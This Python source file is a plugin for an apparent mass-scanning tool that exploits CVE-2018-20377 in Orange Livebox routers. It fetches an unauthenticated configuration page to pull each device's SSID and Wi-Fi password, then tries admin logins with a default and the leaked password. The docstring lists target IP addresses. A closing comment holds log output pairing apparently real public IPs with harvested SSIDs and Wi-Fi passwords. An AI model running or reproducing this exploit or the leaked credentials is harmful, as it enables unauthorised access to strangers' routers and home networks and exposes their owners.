#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
*---------------*
|CVE-2018-20377 |
*---------------*
Sources:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20377
https://www.cvedetails.com/cve/CVE-2018-20377/
https://github.com/zadewg/LIVEBOX-0DAY
https://nvd.nist.gov/vuln/detail/CVE-2018-20377

livebox:
*	http://89.129.126.167:8080/get_getnetworkconf.cgi
*	http://70.40.245.92:8080/get_getnetworkconf.cgi

http://85.56.33.38:8080/index.stm

"""
import requests
import logging as log
from .IPlugin import IPlugin, connection_type
from bs4 import BeautifulSoup

keywords = ['log',
			'user',
			'usr',
			'pass',
			'pw']

def check_if_login_form(input):
	if input.has_attr('type') and input['type'] == 'password':
		return True
	if input.has_attr('name'):
		for word in keywords:
			inpt = input['name'].lower()
			if word in inpt:
				return True
	return False

def find_forms(page):
	fields = {}
	try:
		for form in page.findAll('form'):
			if not form.has_attr('action'):
				continue
			action = form['action']
			is_login_form = False
			for input in form.find_all('input'):
				if check_if_login_form(input):
					is_login_form = True
				if input.has_attr('type') and input['type'] in ('submit', 'image') and not input.has_attr('name'):
					continue
				if input.has_attr('type') and input['type'] in ('text', 'hidden', 'password', 'submit', 'image'):
					value = ''
					if input.has_attr('value'):
						value = input['value']				
					if input.has_attr('name'):
						fields[input['name']] = value
					continue
			if is_login_form:
				return action, fields
	except Exception as e: log.error("Plugin:", e)
	return None, None

def try_auth(url, password='admin'):
	print(url[:-23])
	url = "{}{}".format(url[:-23],'/cgi-bin/login.exe')
	body = {'user': 'admin', 'pws': password}
	log.info("ATTEMPT to LOGIN to {} -> {}".format(url, body))
	try:
		res = requests.post(url, data=body)
		if res and 'info_statusnok' in res.text:
			return False
		return True
	except Exception as e: log.error('Error POST to {} -> {}'.format(url, e))
	return False

class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 8080
		self.relative_url = "/get_getnetworkconf.cgi"
		self.connection_type = connection_type.WEB

	def config(self):
		pass

	def exec(self, res):
		log.debug("Executing plugin for {}".format(res.url))
		if 'livebox' in res.text:
			cred_page = requests.get('{}/{}'.format(res.url,'cgi-bin/login.exe'), allow_redirects=True, verify=False, timeout=5)
			if cred_page and cred_page.status_code == 200:
					arr = cred_page.text.split('\n')
					ssid = arr[2][:-4]
					password = arr[3][:-4]
					log.info("Found SSID and default passwd for {} -> {}:{} ".format(res.url,ssid, password))
					if try_auth(res.url) or try_auth(res.url, password):
						log.info("VULNERABLE Device {} !!".format(res.url))

'''
-> Orange-C234:3C69C3A5
[INFO plugins] Found SSID and default passwd for http://90.68.85.77:8080/get_getnetworkconf.cgi -> Orange-5581:SdLXZAA6
[INFO plugins] Found SSID and default passwd for http://92.187.224.65:8080/get_getnetworkconf.cgi -> Orange-E65E:7624946A
[INFO plugins] Found SSID and default passwd for http://92.189.41.116:8080/get_getnetworkconf.cgi -> Orange-72F4:xXRaJVDd
[INFO plugins] Found SSID and default passwd for http://92.187.224.36:8080/get_getnetworkconf.cgi -> Orange-E229:AE429FE7
[INFO plugins] Found SSID and default passwd for http://85.60.223.24:8080/get_getnetworkconf.cgi -> Orange-1642:ACq3WwLS
[INFO plugins] Found SSID and defa
'''